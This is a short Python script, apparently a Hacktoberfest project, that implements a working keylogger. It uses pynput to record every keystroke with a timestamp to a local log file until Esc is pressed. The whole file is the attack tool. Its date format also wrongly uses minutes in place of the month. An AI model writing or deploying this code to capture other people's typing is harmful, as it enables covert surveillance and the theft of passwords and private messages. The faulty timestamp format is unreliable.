#!/usr/bin/env python3
"""
created: 2022-10-17, @author: seraph776, project: Keylogger (Hacktoberfest 2022)
"""

from pynput.keyboard import Key, Listener
import logging


logging.basicConfig(filename="keystroke_log.txt",
                    level=logging.DEBUG,
                    style="{",
                    datefmt='%Y-%d-%M %H:%M:%S',
                    format='[{asctime}]: {message}')


def on_press(key) -> None:
    logging.info(str(key))


def on_release(key) -> bool:
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
